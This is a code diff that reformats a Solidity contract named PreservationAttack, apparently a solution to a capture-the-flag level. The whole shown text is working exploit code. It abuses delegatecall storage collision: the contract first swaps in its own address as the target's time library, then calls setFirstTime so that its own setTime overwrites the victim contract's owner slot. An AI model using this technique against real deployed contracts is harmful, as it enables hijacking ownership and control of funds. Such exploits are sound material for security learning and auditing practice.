@@ -9,16 +9,16 @@ contract PreservationAttack {
     address public owner;
 
     constructor() {
-	owner = msg.sender;
-    }
-    
-    function attack(address preservationAddress) public {
-	Preservation preservation = Preservation(preservationAddress);
-	preservation.setSecondTime(uint160(address(this)));
-	preservation.setFirstTime(uint160(msg.sender));
+        owner = msg.sender;
     }
 
-    function setTime(uint _time) public {
-	owner = address(uint160(_time));
+    function attack(address preservationAddress) public {
+        Preservation preservation = Preservation(preservationAddress);
+        preservation.setSecondTime(uint160(address(this)));
+        preservation.setFirstTime(uint160(msg.sender));
+    }
+
+    function setTime(uint256 _time) public {
+        owner = address(uint160(_time));
     }
 }
